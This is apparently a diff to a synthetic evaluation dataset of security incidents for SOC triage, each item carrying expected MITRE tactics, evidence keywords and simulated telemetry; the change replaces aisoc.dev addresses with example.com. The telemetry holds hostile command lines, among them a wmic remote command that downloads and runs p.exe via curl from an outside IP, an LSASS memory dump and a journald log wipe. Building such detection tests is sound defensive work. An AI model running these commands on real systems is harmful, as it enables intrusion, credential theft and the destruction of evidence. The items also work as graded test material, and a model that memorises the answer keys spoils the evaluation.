@@ -6006,7 +6006,7 @@
     "id": "INC-EVAL-131",
     "template_id": "lsass-memory-dump",
     "template_index": 20,
-    "title": "LSASS memory dump on GCP-GKE-NODE-04 by grace@aisoc.dev",
+    "title": "LSASS memory dump on GCP-GKE-NODE-04 by grace@example.com",
     "description": "comsvcs.dll MiniDump observed on GCP-GKE-NODE-04. lsass.exe memory dumped to C:\\Windows\\Temp\\. Mimikatz signatures detected.",
     "expected_tactics": [
       "TA0006"
@@ -6022,7 +6022,7 @@
       "comsvcs",
       "mimikatz",
       "GCP-GKE-NODE-04",
-      "grace@aisoc.dev"
+      "grace@example.com"
     ],
     "telemetry": [
       {
@@ -6035,7 +6035,7 @@
         "TargetImage": "C:\\Windows\\System32\\lsass.exe",
         "GrantedAccess": "0x1010",
         "CallTrace": "comsvcs.dll+5d24|MiniDumpWriteDump",
-        "User": "grace@aisoc.dev"
+        "User": "grace@example.com"
       },
       {
         "source": "sysmon",
@@ -6045,7 +6045,7 @@
         "Computer": "GCP-GKE-NODE-04",
         "Image": "C:\\Windows\\System32\\rundll32.exe",
         "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp",
-        "User": "grace@aisoc.dev"
+        "User": "grace@example.com"
       }
     ]
   },
@@ -6053,8 +6053,8 @@
     "id": "INC-EVAL-132",
     "template_id": "credential-spray",
     "template_index": 21,
-    "title": "Brute-force credential spray against cfo@aisoc.dev from 91.134.231.15",
-    "description": "Credential spray from 91.134.231.15 against cfo@aisoc.dev. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+    "title": "Brute-force credential spray against cfo@example.com from 91.134.231.15",
+    "description": "Credential spray from 91.134.231.15 against cfo@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -6066,7 +6066,7 @@
     "evidence_keywords": [
       "brute force",
       "credential spray",
-      "cfo@aisoc.dev",
+      "cfo@example.com",
       "91.134.231.15",
       "azure ad"
     ],
@@ -6074,7 +6074,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "cfo@aisoc.dev",
+        "userPrincipalName": "cfo@example.com",
         "ipAddress": "91.134.231.15",
         "resultType": 50126,
         "resultDescription": "Invalid username or password",
@@ -6084,7 +6084,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "cfo@aisoc.dev",
+        "userPrincipalName": "cfo@example.com",
         "ipAddress": "91.134.231.15",
         "resultType": 0,
         "resultDescription": "Success",
@@ -6098,7 +6098,7 @@
     "template_id": "kerberoasting",
     "template_index": 22,
     "title": "Kerberoasting from WIN-EXCHANGE-01",
-    "description": "Service account TGS tickets requested en-masse from WIN-EXCHANGE-01 by svc-backup@aisoc.dev. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
+    "description": "Service account TGS tickets requested en-masse from WIN-EXCHANGE-01 by svc-backup@example.com. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
     "expected_tactics": [
       "TA0006",
       "TA0008"
@@ -6115,7 +6115,7 @@
       "RC4",
       "mimikatz",
       "WIN-EXCHANGE-01",
-      "svc-backup@aisoc.dev"
+      "svc-backup@example.com"
     ],
     "telemetry": [
       {
@@ -6124,8 +6124,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "svc-backup@aisoc.dev",
-        "ServiceName": "MSSQLSvc/sql.aisoc.dev",
+        "TargetUserName": "svc-backup@example.com",
+        "ServiceName": "MSSQLSvc/sql.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "WIN-EXCHANGE-01"
       },
@@ -6135,8 +6135,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "svc-backup@aisoc.dev",
-        "ServiceName": "HTTP/web01.aisoc.dev",
+        "TargetUserName": "svc-backup@example.com",
+        "ServiceName": "HTTP/web01.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "WIN-EXCHANGE-01"
       }
@@ -6147,7 +6147,7 @@
     "template_id": "ad-dcsync",
     "template_index": 23,
     "title": "Active Directory DCSync from non-DC host WIN-FIN-DB01",
-    "description": "Replication rights abused from WIN-FIN-DB01 by grace@aisoc.dev. All domain NTLM hashes replicated. Severe credential exposure.",
+    "description": "Replication rights abused from WIN-FIN-DB01 by grace@example.com. All domain NTLM hashes replicated. Severe credential exposure.",
     "expected_tactics": [
       "TA0006",
       "TA0004"
@@ -6163,7 +6163,7 @@
       "replication",
       "ntlm hash",
       "WIN-FIN-DB01",
-      "grace@aisoc.dev"
+      "grace@example.com"
     ],
     "telemetry": [
       {
@@ -6172,7 +6172,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "grace@aisoc.dev",
+        "SubjectUserName": "grace@example.com",
         "ObjectServer": "DS",
         "ObjectType": "domainDNS",
         "Properties": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
@@ -6184,8 +6184,8 @@
     "id": "INC-EVAL-135",
     "template_id": "saml-golden-ticket",
     "template_index": 24,
-    "title": "SAML golden-ticket: forged assertion targeting svc-deploy@aisoc.dev",
-    "description": "Forged SAML assertion detected for svc-deploy@aisoc.dev. Attacker pivoted to Azure AD; account enumeration followed from 45.142.122.111.",
+    "title": "SAML golden-ticket: forged assertion targeting svc-deploy@example.com",
+    "description": "Forged SAML assertion detected for svc-deploy@example.com. Attacker pivoted to Azure AD; account enumeration followed from 45.142.122.111.",
     "expected_tactics": [
       "TA0006",
       "TA0007"
@@ -6201,14 +6201,14 @@
       "golden ticket",
       "forged",
       "azure ad",
-      "svc-deploy@aisoc.dev",
+      "svc-deploy@example.com",
       "45.142.122.111"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "svc-deploy@aisoc.dev",
+        "userPrincipalName": "svc-deploy@example.com",
         "ipAddress": "45.142.122.111",
         "resultType": 0,
         "authenticationDetails": [
@@ -6218,13 +6218,13 @@
           }
         ],
         "tokenIssuerType": "ADFederationServices",
-        "tokenIssuerName": "forged-adfs.aisoc.dev"
+        "tokenIssuerName": "forged-adfs.example.com"
       },
       {
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Add member to role.",
-        "UserId": "svc-deploy@aisoc.dev",
+        "UserId": "svc-deploy@example.com",
         "ModifiedProperties": [
           {
             "Name": "Role.DisplayName",
@@ -6239,7 +6239,7 @@
     "template_id": "ldap-bloodhound-discovery",
     "template_index": 25,
     "title": "Domain enumeration from GCP-GKE-NODE-04",
-    "description": "ldap discovery from GCP-GKE-NODE-04 by ceo@aisoc.dev: BloodHound-style queries enumerating users, groups, ACLs.",
+    "description": "ldap discovery from GCP-GKE-NODE-04 by ceo@example.com: BloodHound-style queries enumerating users, groups, ACLs.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -6253,7 +6253,7 @@
       "bloodhound",
       "domain enumeration",
       "GCP-GKE-NODE-04",
-      "ceo@aisoc.dev"
+      "ceo@example.com"
     ],
     "telemetry": [
       {
@@ -6265,7 +6265,7 @@
         "Image": "C:\\Tools\\SharpHound.exe",
         "DestinationIp": "WIN-DC-PRIMARY",
         "DestinationPort": 389,
-        "User": "ceo@aisoc.dev"
+        "User": "ceo@example.com"
       },
       {
         "source": "windows_security",
@@ -6273,7 +6273,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "ceo@aisoc.dev",
+        "SubjectUserName": "ceo@example.com",
         "ObjectType": "user",
         "AccessMask": "0x100",
         "EventCount": 8400
@@ -6285,7 +6285,7 @@
     "template_id": "smb-share-enumeration",
     "template_index": 26,
     "title": "Network share enumeration on LIN-EDGE-VPN02",
-    "description": "Mass SMB share enumeration from LIN-EDGE-VPN02 by ops-lead@aisoc.dev; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
+    "description": "Mass SMB share enumeration from LIN-EDGE-VPN02 by ops-lead@example.com; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -6300,7 +6300,7 @@
       "Get-SmbShare",
       "share enumeration",
       "LIN-EDGE-VPN02",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
     "telemetry": [
       {
@@ -6309,7 +6309,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-EDGE-VPN02",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "Image": "C:\\Windows\\System32\\net.exe",
         "CommandLine": "net.exe view /domain"
       },
@@ -6319,7 +6319,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 5145,
         "Computer": "WIN-FILE-SHARE",
-        "SubjectUserName": "ops-lead@aisoc.dev",
+        "SubjectUserName": "ops-lead@example.com",
         "ShareName": "\\\\*\\*",
         "IpAddress": "LIN-EDGE-VPN02",
         "EventCount": 256
@@ -6331,7 +6331,7 @@
     "template_id": "pass-the-hash-lateral",
     "template_index": 27,
     "title": "Pass-the-hash from LIN-DB-REPLICA to MAC-LEGAL-LAPTOP",
-    "description": "Pass-the-hash lateral movement from LIN-DB-REPLICA to MAC-LEGAL-LAPTOP by svc-deploy@aisoc.dev. Golden ticket indicators present. Linked to MagicWeb.",
+    "description": "Pass-the-hash lateral movement from LIN-DB-REPLICA to MAC-LEGAL-LAPTOP by svc-deploy@example.com. Golden ticket indicators present. Linked to MagicWeb.",
     "expected_tactics": [
       "TA0008",
       "TA0006"
@@ -6347,7 +6347,7 @@
       "golden ticket",
       "LIN-DB-REPLICA",
       "MAC-LEGAL-LAPTOP",
-      "svc-deploy@aisoc.dev",
+      "svc-deploy@example.com",
       "MagicWeb"
     ],
     "telemetry": [
@@ -6357,7 +6357,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "MAC-LEGAL-LAPTOP",
-        "TargetUserName": "svc-deploy@aisoc.dev",
+        "TargetUserName": "svc-deploy@example.com",
         "LogonType": 3,
         "AuthenticationPackageName": "NTLM",
         "IpAddress": "LIN-DB-REPLICA",
@@ -6369,7 +6369,7 @@
         "severity": "high",
         "Computer": "MAC-LEGAL-LAPTOP",
         "Source": "LIN-DB-REPLICA",
-        "User": "svc-deploy@aisoc.dev",
+        "User": "svc-deploy@example.com",
         "threat_actor": "MagicWeb"
       }
     ]
@@ -6379,7 +6379,7 @@
     "template_id": "rdp-lateral-movement",
     "template_index": 28,
     "title": "RDP lateral movement from WIN-EXCHANGE-01",
-    "description": "Anomalous RDP session from WIN-EXCHANGE-01 (dave@aisoc.dev) to AWS-EC2-PROD-API outside business hours. Source admin not normal for AWS-EC2-PROD-API.",
+    "description": "Anomalous RDP session from WIN-EXCHANGE-01 (dave@example.com) to AWS-EC2-PROD-API outside business hours. Source admin not normal for AWS-EC2-PROD-API.",
     "expected_tactics": [
       "TA0008"
     ],
@@ -6394,7 +6394,7 @@
       "outside hours",
       "WIN-EXCHANGE-01",
       "AWS-EC2-PROD-API",
-      "dave@aisoc.dev"
+      "dave@example.com"
     ],
     "telemetry": [
       {
@@ -6403,7 +6403,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "AWS-EC2-PROD-API",
-        "TargetUserName": "dave@aisoc.dev",
+        "TargetUserName": "dave@example.com",
         "LogonType": 10,
         "IpAddress": "WIN-EXCHANGE-01",
         "LogonProcessName": "User32",
@@ -6416,7 +6416,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from MAC-CFO-LAPTOP to MAC-LEGAL-LAPTOP",
-    "description": "wmic.exe /node:MAC-LEGAL-LAPTOP process call create observed from MAC-CFO-LAPTOP by ceo@aisoc.dev. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:MAC-LEGAL-LAPTOP process call create observed from MAC-CFO-LAPTOP by ceo@example.com. Remote command execution; payload from 91.134.231.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -6431,7 +6431,7 @@
       "lateral",
       "MAC-CFO-LAPTOP",
       "MAC-LEGAL-LAPTOP",
-      "ceo@aisoc.dev",
+      "ceo@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
@@ -6441,7 +6441,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "MAC-CFO-LAPTOP",
-        "User": "ceo@aisoc.dev",
+        "User": "ceo@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
         "CommandLine": "wmic /node:MAC-LEGAL-LAPTOP process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
@@ -6451,8 +6451,8 @@
     "id": "INC-EVAL-141",
     "template_id": "bulk-pii-download",
     "template_index": 30,
-    "title": "Bulk PII download by ops-lead@aisoc.dev",
-    "description": "ops-lead@aisoc.dev downloaded >10 GB of customer records from production database from WIN-DC-PRIMARY. Outside normal access pattern.",
+    "title": "Bulk PII download by ops-lead@example.com",
+    "description": "ops-lead@example.com downloaded >10 GB of customer records from production database from WIN-DC-PRIMARY. Outside normal access pattern.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -6468,13 +6468,13 @@
       "pii",
       "customer record",
       "WIN-DC-PRIMARY",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
     "telemetry": [
       {
         "source": "db_audit",
         "operation": "SELECT",
-        "user": "ops-lead@aisoc.dev",
+        "user": "ops-lead@example.com",
         "src_host": "WIN-DC-PRIMARY",
         "database": "prod_customers",
         "table": "customer_records",
@@ -6488,7 +6488,7 @@
     "template_id": "clipboard-keylogger",
     "template_index": 31,
     "title": "Clipboard logging implant on WIN-PROD-WEB02",
-    "description": "Clipboard contents from WIN-PROD-WEB02 (svc-deploy@aisoc.dev) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
+    "description": "Clipboard contents from WIN-PROD-WEB02 (svc-deploy@example.com) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
     "expected_tactics": [
       "TA0009"
     ],
@@ -6502,7 +6502,7 @@
       "keylog",
       "credentials",
       "WIN-PROD-WEB02",
-      "svc-deploy@aisoc.dev"
+      "svc-deploy@example.com"
     ],
     "telemetry": [
       {
@@ -6511,8 +6511,8 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 24,
         "Computer": "WIN-PROD-WEB02",
-        "User": "svc-deploy@aisoc.dev",
-        "Image": "C:\\Users\\svc-deploy@aisoc.dev\\AppData\\Local\\sched.exe",
+        "User": "svc-deploy@example.com",
+        "Image": "C:\\Users\\svc-deploy@example.com\\AppData\\Local\\sched.exe",
         "Hashes": "SHA256=abc..."
       },
       {
@@ -6521,9 +6521,9 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 11,
         "Computer": "WIN-PROD-WEB02",
-        "Image": "C:\\Users\\svc-deploy@aisoc.dev\\AppData\\Local\\sched.exe",
-        "TargetFilename": "C:\\Users\\svc-deploy@aisoc.dev\\AppData\\Local\\clip.log",
-        "User": "svc-deploy@aisoc.dev"
+        "Image": "C:\\Users\\svc-deploy@example.com\\AppData\\Local\\sched.exe",
+        "TargetFilename": "C:\\Users\\svc-deploy@example.com\\AppData\\Local\\clip.log",
+        "User": "svc-deploy@example.com"
       }
     ]
   },
@@ -6568,7 +6568,7 @@
     "template_id": "s3-exfil-cloud-storage",
     "template_index": 33,
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-PROD-WEB02",
-    "description": "Egress from WIN-PROD-WEB02 to s3://atk-stage-185.220.101.7/dump/ by ops-lead@aisoc.dev. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+    "description": "Egress from WIN-PROD-WEB02 to s3://atk-stage-185.220.101.7/dump/ by ops-lead@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
     "expected_tactics": [
       "TA0010"
     ],
@@ -6584,7 +6584,7 @@
       "exfiltrat",
       "WIN-PROD-WEB02",
       "185.220.101.7",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
     "telemetry": [
       {
@@ -6594,7 +6594,7 @@
         "awsRegion": "us-east-1",
         "userIdentity": {
           "type": "IAMUser",
-          "userName": "ops-lead@aisoc.dev"
+          "userName": "ops-lead@example.com"
         },
         "sourceIPAddress": "WIN-PROD-WEB02",
         "requestParameters": {
@@ -6613,8 +6613,8 @@
     "id": "INC-EVAL-145",
     "template_id": "personal-drive-exfil",
     "template_index": 34,
-    "title": "Personal Drive exfil by ceo@aisoc.dev",
-    "description": "ceo@aisoc.dev on AWS-EC2-PROD-API uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
+    "title": "Personal Drive exfil by ceo@example.com",
+    "description": "ceo@example.com on AWS-EC2-PROD-API uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -6632,7 +6632,7 @@
       "source code",
       "pii",
       "AWS-EC2-PROD-API",
-      "ceo@aisoc.dev"
+      "ceo@example.com"
     ],
     "telemetry": [
       {
@@ -6641,7 +6641,7 @@
         "url": "https://www.googleapis.com/upload/drive/v3/files",
         "status_code": 200,
         "src_host": "AWS-EC2-PROD-API",
-        "src_user": "ceo@aisoc.dev",
+        "src_user": "ceo@example.com",
         "bytes_out": 4300000000,
         "file_count": 812
       }
@@ -6736,7 +6736,7 @@
     "template_id": "ransomware-encryption",
     "template_index": 37,
     "title": "Ransomware encryption in progress on LIN-DB-REPLICA",
-    "description": "Mass file rename observed on LIN-DB-REPLICA (heidi@aisoc.dev); ..enc extension applied to ~20 k files. Ransomware note R3ADM3-Emotet epoch 5.txt found.",
+    "description": "Mass file rename observed on LIN-DB-REPLICA (heidi@example.com); ..enc extension applied to ~20 k files. Ransomware note R3ADM3-Emotet epoch 5.txt found.",
     "expected_tactics": [
       "TA0040"
     ],
@@ -6751,7 +6751,7 @@
       "rename",
       "ransom note",
       "LIN-DB-REPLICA",
-      "heidi@aisoc.dev",
+      "heidi@example.com",
       "Emotet epoch 5"
     ],
     "telemetry": [
@@ -6762,8 +6762,8 @@
         "EventID": 11,
         "Computer": "LIN-DB-REPLICA",
         "Image": "C:\\ProgramData\\enc.exe",
-        "TargetFilename": "C:\\Users\\heidi@aisoc.dev\\Documents\\notes.docx.enc",
-        "User": "heidi@aisoc.dev",
+        "TargetFilename": "C:\\Users\\heidi@example.com\\Documents\\notes.docx.enc",
+        "User": "heidi@example.com",
         "rename_rate_per_min": 4200
       },
       {
@@ -6773,8 +6773,8 @@
         "EventID": 11,
         "Computer": "LIN-DB-REPLICA",
         "Image": "C:\\ProgramData\\enc.exe",
-        "TargetFilename": "C:\\Users\\heidi@aisoc.dev\\Desktop\\R3ADM3-Emotet epoch 5.txt",
-        "User": "heidi@aisoc.dev"
+        "TargetFilename": "C:\\Users\\heidi@example.com\\Desktop\\R3ADM3-Emotet epoch 5.txt",
+        "User": "heidi@example.com"
       },
       {
         "source": "edr",
@@ -6826,8 +6826,8 @@
     "id": "INC-EVAL-150",
     "template_id": "bec-wire-fraud",
     "template_index": 39,
-    "title": "BEC: payment redirect by admin@aisoc.dev",
-    "description": "Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by admin@aisoc.dev from WIN-FILE-SHARE to threat-actor account. Linked to APT29.",
+    "title": "BEC: payment redirect by admin@example.com",
+    "description": "Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by admin@example.com from WIN-FILE-SHARE to threat-actor account. Linked to APT29.",
     "expected_tactics": [
       "TA0001",
       "TA0040"
@@ -6843,7 +6843,7 @@
       "spoofed cfo",
       "wire transfer",
       "$250",
-      "admin@aisoc.dev",
+      "admin@example.com",
       "WIN-FILE-SHARE",
       "APT29"
     ],
@@ -6852,10 +6852,10 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "Send",
-        "UserId": "admin@aisoc.dev",
+        "UserId": "admin@example.com",
         "ClientIP": "WIN-FILE-SHARE",
         "Subject": "URGENT: Wire instructions from CFO",
-        "From": "cfo@aisoc.dev.spoof",
+        "From": "cfo@example.com.spoof",
         "ReplyTo": "cfo-aisoc@protonmail.com",
         "threat_actor": "APT29"
       }
@@ -6892,7 +6892,7 @@
         "awsRegion": "us-east-1",
         "userIdentity": {
           "type": "IAMUser",
-          "userName": "ops-lead@aisoc.dev"
+          "userName": "ops-lead@example.com"
         },
         "requestParameters": {
           "bucketName": "aisoc-employees",
@@ -6926,8 +6926,8 @@
     "id": "INC-EVAL-152",
     "template_id": "azure-ad-impossible-travel",
     "template_index": 41,
-    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for carol@aisoc.dev",
-    "description": "Successful Azure AD sign-in for carol@aisoc.dev from 91.134.231.15 (impossible-travel from prior location). MFA satisfied via stolen session token.",
+    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for carol@example.com",
+    "description": "Successful Azure AD sign-in for carol@example.com from 91.134.231.15 (impossible-travel from prior location). MFA satisfied via stolen session token.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -6943,14 +6943,14 @@
       "impossible travel",
       "session token",
       "mfa",
-      "carol@aisoc.dev",
+      "carol@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "carol@aisoc.dev",
+        "userPrincipalName": "carol@example.com",
         "ipAddress": "91.134.231.15",
         "location": {
           "city": "Vladivostok",
@@ -7009,8 +7009,8 @@
     "id": "INC-EVAL-154",
     "template_id": "insider-mailbox-export",
     "template_index": 43,
-    "title": "Insider preparing departure: large mailbox export by heidi@aisoc.dev",
-    "description": "heidi@aisoc.dev exported full mailbox PST (8 GB) from WIN-EXCHANGE-01. HR flag: notice given last week.",
+    "title": "Insider preparing departure: large mailbox export by heidi@example.com",
+    "description": "heidi@example.com exported full mailbox PST (8 GB) from WIN-EXCHANGE-01. HR flag: notice given last week.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -7026,7 +7026,7 @@
       "PST",
       "insider",
       "departure",
-      "heidi@aisoc.dev",
+      "heidi@example.com",
       "WIN-EXCHANGE-01"
     ],
     "telemetry": [
@@ -7034,10 +7034,10 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-MailboxExportRequest",
-        "UserId": "heidi@aisoc.dev",
+        "UserId": "heidi@example.com",
         "Parameters": {
-          "Mailbox": "heidi@aisoc.dev",
-          "FilePath": "\\\\WIN-EXCHANGE-01\\export\\heidi@aisoc.dev.pst"
+          "Mailbox": "heidi@example.com",
+          "FilePath": "\\\\WIN-EXCHANGE-01\\export\\heidi@example.com.pst"
         },
         "Bytes": 8300000000
       }
@@ -7047,8 +7047,8 @@
     "id": "INC-EVAL-155",
     "template_id": "office-vsto-addin",
     "template_index": 44,
-    "title": "Malicious Office add-in installed for carol@aisoc.dev",
-    "description": "Office VSTO add-in registered under HKCU for carol@aisoc.dev on WIN-DC-SECONDARY; loads on every Outlook startup; beacons to 45.142.122.111.",
+    "title": "Malicious Office add-in installed for carol@example.com",
+    "description": "Office VSTO add-in registered under HKCU for carol@example.com on WIN-DC-SECONDARY; loads on every Outlook startup; beacons to 45.142.122.111.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -7063,7 +7063,7 @@
       "office add-in",
       "vsto",
       "outlook",
-      "carol@aisoc.dev",
+      "carol@example.com",
       "WIN-DC-SECONDARY",
       "45.142.122.111"
     ],
@@ -7074,10 +7074,10 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "WIN-DC-SECONDARY",
-        "User": "carol@aisoc.dev",
+        "User": "carol@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKCU\\Software\\Microsoft\\Office\\Outlook\\Addins\\Aisoc.Updater",
-        "Details": "LoadBehavior=3;Manifest=file:///C:/Users/carol@aisoc.dev/AppData/Roaming/aisoc.vsto"
+        "Details": "LoadBehavior=3;Manifest=file:///C:/Users/carol@example.com/AppData/Roaming/aisoc.vsto"
       },
       {
         "source": "sysmon",
@@ -7096,7 +7096,7 @@
     "template_id": "github-pat-leak",
     "template_index": 45,
     "title": "GitHub PAT leaked and abused from 45.142.122.111",
-    "description": "Personal access token belonging to dave@aisoc.dev used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+    "description": "Personal access token belonging to dave@example.com used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -7112,14 +7112,14 @@
       "pat",
       "token",
       "private repo",
-      "dave@aisoc.dev",
+      "dave@example.com",
       "45.142.122.111"
     ],
     "telemetry": [
       {
         "source": "github_audit",
         "action": "git.clone",
-        "actor": "dave@aisoc.dev",
+        "actor": "dave@example.com",
         "actor_ip": "45.142.122.111",
         "repo_count": 14,
         "programmatic_access_type": "personal_access_token",
@@ -7128,8 +7128,8 @@
       {
         "source": "github_audit",
         "action": "push",
-        "actor": "dave@aisoc.dev",
-        "repo": "dave@aisoc.dev/dotfiles",
+        "actor": "dave@example.com",
+        "repo": "dave@example.com/dotfiles",
         "visibility": "public",
         "file_changed": ".env",
         "secret_detected": "github_pat_*"
@@ -7188,8 +7188,8 @@
     "id": "INC-EVAL-158",
     "template_id": "helpdesk-password-reset-abuse",
     "template_index": 47,
-    "title": "Vendor admin password reset abuse for frank@aisoc.dev",
-    "description": "Password reset for frank@aisoc.dev performed by helpdesk in response to social-engineering call from 91.134.231.15. Token claimed within 90 seconds.",
+    "title": "Vendor admin password reset abuse for frank@example.com",
+    "description": "Password reset for frank@example.com performed by helpdesk in response to social-engineering call from 91.134.231.15. Token claimed within 90 seconds.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -7204,7 +7204,7 @@
       "password reset",
       "social engineering",
       "helpdesk",
-      "frank@aisoc.dev",
+      "frank@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
@@ -7212,14 +7212,14 @@
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Reset user password.",
-        "UserId": "helpdesk@aisoc.dev",
-        "TargetUserId": "frank@aisoc.dev",
+        "UserId": "helpdesk@example.com",
+        "TargetUserId": "frank@example.com",
         "ClientIP": "10.0.0.50"
       },
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "frank@aisoc.dev",
+        "userPrincipalName": "frank@example.com",
         "ipAddress": "91.134.231.15",
         "resultType": 0,
         "seconds_after_reset": 87
@@ -7230,8 +7230,8 @@
     "id": "INC-EVAL-159",
     "template_id": "oauth-refresh-token-theft",
     "template_index": 48,
-    "title": "OAuth refresh-token theft for carol@aisoc.dev",
-    "description": "Refresh token for carol@aisoc.dev replayed from 10.0.99.42. Granted access to mailbox + OneDrive without re-prompt.",
+    "title": "OAuth refresh-token theft for carol@example.com",
+    "description": "Refresh token for carol@example.com replayed from 10.0.99.42. Granted access to mailbox + OneDrive without re-prompt.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -7246,14 +7246,14 @@
       "replay",
       "onedrive",
       "mailbox",
-      "carol@aisoc.dev",
+      "carol@example.com",
       "10.0.99.42"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "carol@aisoc.dev",
+        "userPrincipalName": "carol@example.com",
         "ipAddress": "10.0.99.42",
         "resultType": 0,
         "authenticationProtocol": "oAuth2",
@@ -7322,8 +7322,8 @@
     "id": "INC-EVAL-161",
     "template_id": "outlook-auto-forward-rule",
     "template_index": 50,
-    "title": "Outlook rule auto-forwarding mail from carol@aisoc.dev",
-    "description": "Outlook inbox rule created for carol@aisoc.dev that forwards all mail to external address at 185.220.101.7. Linked to LockBit 3.0.",
+    "title": "Outlook rule auto-forwarding mail from carol@example.com",
+    "description": "Outlook inbox rule created for carol@example.com that forwards all mail to external address at 185.220.101.7. Linked to LockBit 3.0.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -7338,7 +7338,7 @@
       "outlook rule",
       "forward",
       "mail",
-      "carol@aisoc.dev",
+      "carol@example.com",
       "185.220.101.7",
       "LockBit 3.0"
     ],
@@ -7347,7 +7347,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-InboxRule",
-        "UserId": "carol@aisoc.dev",
+        "UserId": "carol@example.com",
         "Parameters": {
           "Name": "Sync",
           "ForwardTo": "ext@185.220.101.7",
@@ -7363,7 +7363,7 @@
     "template_id": "linux-journald-tampering",
     "template_index": 51,
     "title": "Linux journald log tampering on WIN-PROD-WEB02",
-    "description": "journalctl --rotate --vacuum-time=1s observed on WIN-PROD-WEB02 by heidi@aisoc.dev; recent journal entries purged. Indicator removal.",
+    "description": "journalctl --rotate --vacuum-time=1s observed on WIN-PROD-WEB02 by heidi@example.com; recent journal entries purged. Indicator removal.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -7377,7 +7377,7 @@
       "log tampering",
       "vacuum",
       "WIN-PROD-WEB02",
-      "heidi@aisoc.dev"
+      "heidi@example.com"
     ],
     "telemetry": [
       {
@@ -7389,7 +7389,7 @@
         "a1": "--rotate",
         "a2": "--vacuum-time=1s",
         "hostname": "WIN-PROD-WEB02",
-        "user": "heidi@aisoc.dev"
+        "user": "heidi@example.com"
       }
     ]
   },
